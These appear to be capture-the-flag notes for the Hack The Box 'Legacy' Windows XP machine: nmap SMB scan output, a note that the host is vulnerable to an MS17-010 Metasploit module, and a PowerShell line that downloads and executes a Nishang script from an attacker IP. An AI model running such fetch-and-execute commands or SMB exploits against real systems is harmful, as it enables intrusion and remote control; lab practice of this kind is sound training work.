## nmap
```
PORT    STATE SERVICE      REASON  VERSION
139/tcp open  netbios-ssn  syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds syn-ack Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h27m36s, deviation: 2h07m16s, median: 4d22h57m36s
| nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:d6:0a (VMware)
| Names:
|   
| Statistics:
|   00 50 56 b9 d6 0a 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 27616/tcp): CLEAN (Timeout)
|   Check 2 (port 48339/tcp): CLEAN (Timeout)
|   Check 3 (port 42444/udp): CLEAN (Timeout)
|   Check 4 (port 63763/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-05-18T07:54:51+03:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)
```

## notes
```
host is vulnerable to admin/smb/ms17_010_command
```

```
powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.10:9000/nishang.ps1')
```